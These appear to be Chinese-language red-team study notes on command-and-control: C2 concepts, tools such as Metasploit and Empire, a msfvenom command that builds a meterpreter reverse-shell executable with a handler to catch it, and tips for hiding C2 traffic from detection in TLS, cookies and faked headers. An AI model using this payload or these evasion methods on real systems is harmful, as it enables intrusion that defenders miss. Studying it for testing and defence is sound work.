指挥与控制
- 概念
    - 长时间保持对目标系统的访问权限
    - 减少可能导致攻击中断的主机和网络控制措施的影响
- C2 系统
    - 功能：接收来自攻击方的命令、执行命令、返回结果
    - 组件：失陷系统上的代理程序、攻击方与失陷服务器的通信服务器、攻击方发送命令的管理程序
        - 失陷代理程序和攻击管理程序与通信服务器通信，从而实现间接发送与接收命令
        - 各种通信协议
            - 持久连接 TCP/HTTPS
            - 定期信标时间检查
                - 随机化以规避检测
- 工具
    - Metasploit, PowerShell Empire, Convenant
    - C2 系统导航 <https://howto.thec2matrix.com/>

metasploit 创建 shell
- 反向 shell 步骤：
    https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html
- 使用 SMB 服务器消息块共享服务以存放载荷
    - 在配置文件 `/etc/samba/smb.conf` 添加共享
    - `service smbd restart` 重启服务
    - `smbclient -L localhost` 客户端检查共享是否成功开启
- 使用 Msfvenom 创建未分阶段的 meterpreter C2 代理作为有效载荷，构建反向 shell
    - `msfvenom -p windows/meterpreter_reverse_tcp -f exe --platform Windows -o /tmp/my_payload.exe`
- 使用处理程序 handler 以捕获回连 shell 的会话
    - `use exploit/multi/handler`

网络免杀
- tls加密，在不使用tls检查的区域不会被识别
	- 若可能存在tls拆包检查，则在c2协议内部使用加密
- 备用协议
	- 在c2系统中组合多个协议以混淆
- c2模板
	- 模板设定C2系统发送接收数据时数据的放置位置
		- 避免使用get的uri传递数据。
		- 将数据放到通常不会被记录的头部，如cookie
		- 对post消息体使用编码与数据加密
		- 使用系统上常规用户的头部信息来伪装头部以接近正常流量
